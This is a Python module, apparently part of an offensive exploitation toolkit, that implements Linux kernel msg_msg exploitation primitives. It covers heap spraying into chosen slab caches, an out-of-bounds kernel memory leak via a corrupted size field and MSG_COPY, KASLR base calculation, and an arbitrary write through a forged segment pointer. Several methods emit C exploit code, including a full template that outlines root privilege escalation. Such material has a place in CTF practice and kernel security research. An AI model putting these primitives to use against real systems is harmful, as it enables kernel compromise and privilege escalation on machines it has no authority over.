"""
Linux kernel msg_msg structure exploitation.

The msg_msg structure is a powerful primitive for kernel exploitation:
- Flexible size allocation (0x31 - 0x1000+ bytes)
- Can span multiple caches (enables cross-cache attacks)
- Provides arbitrary read via msg_copy (MSG_COPY flag)
- next pointer can be corrupted for arbitrary read/write

Structure (kernel 5.x+):
    struct msg_msg {
        struct list_head m_list;  // +0x00: linked list (next, prev)
        long m_type;              // +0x10: message type
        size_t m_ts;              // +0x18: total message size
        struct msg_msgseg *next;  // +0x20: next segment (for large msgs)
        void *security;           // +0x28: SELinux security context
        // data follows at +0x30
    };

    struct msg_msgseg {
        struct msg_msgseg *next;  // +0x00: next segment
        // data follows at +0x08
    };

References:
- https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html
- https://google.github.io/security-research/pocs/linux/msg_msg/
- CVE-2021-22555, CVE-2022-0185
"""

import ctypes
import os
import struct
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Tuple

from supwngo.utils.logging import get_logger

logger = get_logger(__name__)

# System V IPC constants
IPC_PRIVATE = 0
IPC_CREAT = 0o1000
IPC_EXCL = 0o2000
IPC_NOWAIT = 0o4000

MSG_NOERROR = 0o10000
MSG_EXCEPT = 0o20000
MSG_COPY = 0o40000  # Key for exploitation


@dataclass
class MsgMsgHeader:
    """Represents msg_msg header structure."""
    m_list_next: int = 0
    m_list_prev: int = 0
    m_type: int = 1
    m_ts: int = 0
    next_segment: int = 0
    security: int = 0

    HEADER_SIZE = 0x30  # Data starts at offset 0x30
    SEGMENT_HEADER_SIZE = 0x08

    def pack(self) -> bytes:
        """Pack header to bytes."""
        return struct.pack(
            "<QQQQQQ",
            self.m_list_next,
            self.m_list_prev,
            self.m_type,
            self.m_ts,
            self.next_segment,
            self.security,
        )

    @classmethod
    def unpack(cls, data: bytes) -> 'MsgMsgHeader':
        """Unpack bytes to header."""
        values = struct.unpack("<QQQQQQ", data[:0x30])
        return cls(
            m_list_next=values[0],
            m_list_prev=values[1],
            m_type=values[2],
            m_ts=values[3],
            next_segment=values[4],
            security=values[5],
        )


@dataclass
class MsgMsgConfig:
    """Configuration for msg_msg exploitation."""
    target_cache: str = "kmalloc-64"  # Target slab cache
    spray_count: int = 128            # Number of messages to spray
    message_size: int = 0x40          # Size of message data
    use_msg_copy: bool = True         # Use MSG_COPY for leak


class MsgMsgSpray:
    """
    Heap spray using msg_msg structures.

    Messages can target specific kmalloc caches based on size:
    - kmalloc-32:  data_size <= 32 - 0x30 = N/A (too small)
    - kmalloc-64:  data_size <= 64 - 0x30 = 0x22
    - kmalloc-96:  data_size <= 96 - 0x30 = 0x42
    - kmalloc-128: data_size <= 128 - 0x30 = 0x62
    - ...
    - kmalloc-4k:  data_size <= 4096 - 0x30

    For sizes > PAGE_SIZE - 0x30, msg_msgseg is used.
    """

    # Size to cache mapping (data size -> total alloc size -> cache)
    SIZE_TO_CACHE = {
        0x40: "kmalloc-64",
        0x60: "kmalloc-96",
        0x80: "kmalloc-128",
        0x100: "kmalloc-256",
        0x200: "kmalloc-512",
        0x400: "kmalloc-1k",
        0x800: "kmalloc-2k",
        0x1000: "kmalloc-4k",
    }

    def __init__(self, queue_count: int = 16):
        """
        Initialize msg_msg spray.

        Args:
            queue_count: Number of message queues to create
        """
        self.queue_count = queue_count
        self.queues: List[int] = []
        self.messages_per_queue: Dict[int, int] = {}

    def create_queues(self) -> List[int]:
        """
        Create message queues.

        Returns:
            List of queue IDs (msqid)
        """
        self.queues = []
        for _ in range(self.queue_count):
            # In real exploit, this would call msgget()
            # msqid = msgget(IPC_PRIVATE, IPC_CREAT | 0o666)
            pass
        return self.queues

    def calculate_alloc_size(self, data_size: int) -> Tuple[int, str]:
        """
        Calculate actual allocation size and target cache.

        Args:
            data_size: Size of message data

        Returns:
            (allocation_size, cache_name)
        """
        total_size = MsgMsgHeader.HEADER_SIZE + data_size

        for cache_size, cache_name in sorted(self.SIZE_TO_CACHE.items()):
            if total_size <= cache_size:
                return cache_size, cache_name

        # For larger sizes, multiple segments
        return total_size, "kmalloc-4k+"

    def spray(
        self,
        queue_id: int,
        count: int,
        data_size: int,
        data: Optional[bytes] = None,
        mtype: int = 1,
    ) -> int:
        """
        Spray messages to a queue.

        Args:
            queue_id: Message queue ID
            count: Number of messages to send
            data_size: Size of each message's data
            data: Optional data to fill messages
            mtype: Message type

        Returns:
            Number of messages sent
        """
        alloc_size, cache = self.calculate_alloc_size(data_size)
        logger.info(f"Spraying {count} messages, size {data_size} -> {cache}")

        if data is None:
            data = b"A" * data_size

        # In real exploit:
        # for i in range(count):
        #     msgsnd(queue_id, (mtype, data), len(data), 0)

        self.messages_per_queue[queue_id] = count
        return count

    def free_messages(
        self,
        queue_id: int,
        count: int,
        mtype: int = 0,
    ) -> int:
        """
        Free messages from queue.

        Args:
            queue_id: Message queue ID
            count: Number to free
            mtype: Message type (0 = any)

        Returns:
            Number freed
        """
        # In real exploit:
        # for i in range(count):
        #     msgrcv(queue_id, buf, size, mtype, IPC_NOWAIT)
        return count

    def generate_spray_code(
        self,
        data_size: int,
        spray_count: int,
    ) -> str:
        """Generate C code for msg_msg spray."""
        return f'''
#include <sys/msg.h>
#include <stdlib.h>
#include <string.h>

#define MSG_SIZE {data_size}
#define SPRAY_COUNT {spray_count}
#define QUEUE_COUNT 16

int queues[QUEUE_COUNT];

struct {{
    long mtype;
    char mtext[MSG_SIZE];
}} msg;

void spray_msg_msg(void) {{
    // Create queues
    for (int i = 0; i < QUEUE_COUNT; i++) {{
        queues[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (queues[i] < 0) {{
            perror("msgget");
            exit(1);
        }}
    }}

    // Spray messages
    msg.mtype = 1;
    memset(msg.mtext, 'A', MSG_SIZE);

    for (int q = 0; q < QUEUE_COUNT; q++) {{
        for (int i = 0; i < SPRAY_COUNT / QUEUE_COUNT; i++) {{
            if (msgsnd(queues[q], &msg, MSG_SIZE, 0) < 0) {{
                perror("msgsnd");
            }}
        }}
    }}
}}

void free_msg_msg(int queue_idx, int count) {{
    char buf[MSG_SIZE + 8];
    for (int i = 0; i < count; i++) {{
        msgrcv(queues[queue_idx], buf, MSG_SIZE, 0, IPC_NOWAIT);
    }}
}}
'''


class MsgMsgLeak:
    """
    Use msg_msg for kernel memory leak.

    MSG_COPY flag allows reading message without removing it,
    and if we corrupt m_ts (size), we can leak adjacent memory.

    Attack:
    1. Spray msg_msg to position adjacent to target
    2. Trigger UAF/overflow to corrupt msg_msg m_ts field
    3. Use MSG_COPY to read with inflated size
    4. Leaked data contains kernel pointers
    """

    def __init__(self):
        self.leaked_data: bytes = b""
        self.kernel_pointers: List[int] = []

    def corrupt_size_for_leak(
        self,
        original_size: int,
        leak_size: int,
    ) -> bytes:
        """
        Generate corrupted m_ts value for OOB read.

        Args:
            original_size: Original message size
            leak_size: How many extra bytes to leak

        Returns:
            Bytes to write to m_ts field
        """
        new_size = original_size + leak_size
        return struct.pack("<Q", new_size)

    def parse_leaked_pointers(self, data: bytes) -> List[int]:
        """
        Parse kernel pointers from leaked data.

        Args:
            data: Leaked memory

        Returns:
            List of potential kernel pointers
        """
        pointers = []
        for i in range(0, len(data) - 7, 8):
            val = struct.unpack("<Q", data[i:i+8])[0]
            # Check if looks like kernel pointer
            if 0xffff800000000000 <= val <= 0xffffffffffffffff:
                pointers.append(val)
                logger.debug(f"Found kernel pointer at offset {i}: 0x{val:016x}")

        self.kernel_pointers = pointers
        return pointers

    def calculate_kaslr_base(self, leaked_ptr: int, known_offset: int) -> int:
        """
        Calculate kernel ASLR base from leaked pointer.

        Args:
            leaked_ptr: Leaked kernel pointer
            known_offset: Known offset of this symbol

        Returns:
            Kernel base address
        """
        base = leaked_ptr - known_offset
        # Verify alignment
        if base & 0x1fffff != 0:
            logger.warning(f"Suspicious KASLR base alignment: 0x{base:016x}")
        return base

    def generate_leak_code(self, target_offset: int) -> str:
        """Generate C code for msg_msg leak."""
        return f'''
#include <sys/msg.h>
#include <stdio.h>
#include <string.h>

#define ORIGINAL_SIZE 0x40
#define LEAK_SIZE 0x100

// After corrupting m_ts to ORIGINAL_SIZE + LEAK_SIZE:
void leak_via_msg_copy(int msqid) {{
    struct {{
        long mtype;
        char mtext[ORIGINAL_SIZE + LEAK_SIZE];
    }} buf;

    // MSG_COPY reads without removing
    // Will read LEAK_SIZE extra bytes
    ssize_t ret = msgrcv(
        msqid,
        &buf,
        ORIGINAL_SIZE + LEAK_SIZE,
        0,
        MSG_COPY | IPC_NOWAIT
    );

    if (ret > ORIGINAL_SIZE) {{
        printf("[+] Leaked %zd extra bytes\\n", ret - ORIGINAL_SIZE);

        // Parse kernel pointers
        unsigned long *ptrs = (unsigned long *)(buf.mtext + ORIGINAL_SIZE);
        for (int i = 0; i < LEAK_SIZE/8; i++) {{
            if ((ptrs[i] & 0xffff000000000000) == 0xffff000000000000) {{
                printf("[+] Kernel ptr at offset %d: 0x%016lx\\n",
                       {target_offset} + i*8, ptrs[i]);
            }}
        }}
    }}
}}
'''


class MsgMsgWrite:
    """
    Arbitrary write using corrupted msg_msg->next.

    If we can corrupt the 'next' pointer of msg_msg to point
    to arbitrary address - 8, then reading the message will
    copy our data to that address (via msg_msgseg path).

    Attack:
    1. Create msg_msg with size requiring segment (> PAGE_SIZE - 0x30)
    2. Corrupt 'next' pointer via UAF/overflow
    3. Create second message with payload in segment
    4. 'next' now points to target-8, payload copied there
    """

    def __init__(self):
        pass

    def build_fake_segment(
        self,
        target_addr: int,
        payload: bytes,
    ) -> Tuple[bytes, int]:
        """
        Build data to corrupt msg_msg for arbitrary write.

        Args:
            target_addr: Where to write
            payload: What to write

        Returns:
            (corrupted_next_value, payload_for_segment)
        """
        # next pointer should point to target - 8
        # because msg_msgseg data starts at offset 0x08
        fake_next = target_addr - 8

        return struct.pack("<Q", fake_next), payload

    def calculate_write_size(
        self,
        first_segment_data: int,
        payload_size: int,
    ) -> int:
        """
        Calculate total m_ts for write primitive.

        Args:
            first_segment_data: Data in main msg_msg (up to PAGE_SIZE - 0x30)
            payload_size: Size of payload to write

        Returns:
            Value for m_ts field
        """
        # Total size = first segment + payload
        return first_segment_data + payload_size

    def generate_write_code(
        self,
        target_addr: int,
        payload_size: int,
    ) -> str:
        """Generate C code for msg_msg arbitrary write."""
        return f'''
#include <sys/msg.h>
#include <string.h>

#define TARGET_ADDR 0x{target_addr:016x}
#define PAYLOAD_SIZE {payload_size}

// After corrupting msg_msg->next to TARGET_ADDR - 8:
void write_via_msg_msg(char *payload, size_t payload_len) {{
    // When kernel copies msg_msgseg data, it will write
    // payload to TARGET_ADDR

    // The corrupted msg_msg should have:
    // - m_ts = first_segment_size + payload_len
    // - next = TARGET_ADDR - 8

    // Reading this msg will copy data through fake segment
}}

// Typical flow:
// 1. Spray msg_msg of size requiring segment
// 2. Free one msg_msg (UAF target)
// 3. Reclaim with object that lets us write to 'next' field
// 4. Write TARGET_ADDR - 8 to 'next'
// 5. When msg is read, kernel follows next pointer
// 6. Copies segment data to TARGET_ADDR
'''


class MsgMsgExploit:
    """
    Complete msg_msg exploitation helper.

    Combines spraying, leaking, and writing primitives.
    """

    def __init__(self):
        self.spray = MsgMsgSpray()
        self.leak = MsgMsgLeak()
        self.write = MsgMsgWrite()

    def plan_cache_targeting(
        self,
        target_object_size: int,
    ) -> Dict[str, Any]:
        """
        Plan msg_msg spray to target specific cache.

        Args:
            target_object_size: Size of target vulnerable object

        Returns:
            Spray configuration
        """
        # Find matching cache
        for alloc_size, cache in MsgMsgSpray.SIZE_TO_CACHE.items():
            if alloc_size >= target_object_size:
                msg_data_size = alloc_size - MsgMsgHeader.HEADER_SIZE
                return {
                    "cache": cache,
                    "allocation_size": alloc_size,
                    "msg_data_size": msg_data_size,
                    "header_size": MsgMsgHeader.HEADER_SIZE,
                    "spray_count": 128,  # Typical
                    "notes": [
                        f"Use msgsnd with data_size={msg_data_size}",
                        f"This allocates from {cache}",
                        "MSG_COPY allows non-destructive read",
                    ],
                }

        return {"error": "No suitable cache found"}

    def generate_full_exploit_template(
        self,
        vulnerability_type: str,
        target_cache: str,
    ) -> str:
        """
        Generate complete exploit template.

        Args:
            vulnerability_type: "uaf", "overflow", etc.
            target_cache: Target slab cache

        Returns:
            C code template
        """
        return f'''
/*
 * msg_msg exploitation template
 * Target: {target_cache}
 * Vulnerability: {vulnerability_type}
 */

#include <sys/msg.h>
#include <sys/ipc.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define SPRAY_COUNT 128
#define QUEUE_COUNT 16
#define MSG_SIZE 0x{MsgMsgSpray.SIZE_TO_CACHE.get(target_cache, 0x40):x}

int msg_queues[QUEUE_COUNT];

struct msg_buf {{
    long mtype;
    char mtext[MSG_SIZE];
}};

void setup_queues(void) {{
    for (int i = 0; i < QUEUE_COUNT; i++) {{
        msg_queues[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (msg_queues[i] < 0) {{
            perror("msgget");
            exit(1);
        }}
    }}
}}

void spray_msg_msg(void) {{
    struct msg_buf msg;
    msg.mtype = 1;
    memset(msg.mtext, 'A', MSG_SIZE);

    printf("[*] Spraying %d msg_msg structures...\\n", SPRAY_COUNT);

    for (int q = 0; q < QUEUE_COUNT; q++) {{
        for (int i = 0; i < SPRAY_COUNT / QUEUE_COUNT; i++) {{
            if (msgsnd(msg_queues[q], &msg, MSG_SIZE, 0) < 0) {{
                perror("msgsnd");
            }}
        }}
    }}
}}

void free_some_msgs(int queue_idx, int count) {{
    struct msg_buf buf;
    for (int i = 0; i < count; i++) {{
        msgrcv(msg_queues[queue_idx], &buf, MSG_SIZE, 0, IPC_NOWAIT);
    }}
}}

unsigned long leak_kernel_ptr(int queue_idx) {{
    // After corrupting m_ts for OOB read
    char buf[MSG_SIZE + 0x100];
    struct {{
        long mtype;
        char data[MSG_SIZE + 0x100];
    }} *msg = (void *)buf;

    ssize_t ret = msgrcv(
        msg_queues[queue_idx],
        msg,
        MSG_SIZE + 0x100,
        0,
        MSG_COPY | IPC_NOWAIT
    );

    if (ret > MSG_SIZE) {{
        unsigned long *ptrs = (unsigned long *)(msg->data + MSG_SIZE);
        for (int i = 0; i < 0x100/8; i++) {{
            if ((ptrs[i] >> 48) == 0xffff) {{
                printf("[+] Leaked kernel ptr: 0x%016lx\\n", ptrs[i]);
                return ptrs[i];
            }}
        }}
    }}

    return 0;
}}

int main(void) {{
    printf("[*] msg_msg exploitation\\n");

    setup_queues();
    spray_msg_msg();

    // Trigger vulnerability here
    // ...

    // Phase 1: Leak
    // unsigned long kbase = leak_kernel_ptr(0);

    // Phase 2: Write
    // arbitrary_write(target, payload);

    // Phase 3: Privilege escalation
    // commit_creds(prepare_kernel_cred(0));

    return 0;
}}
'''
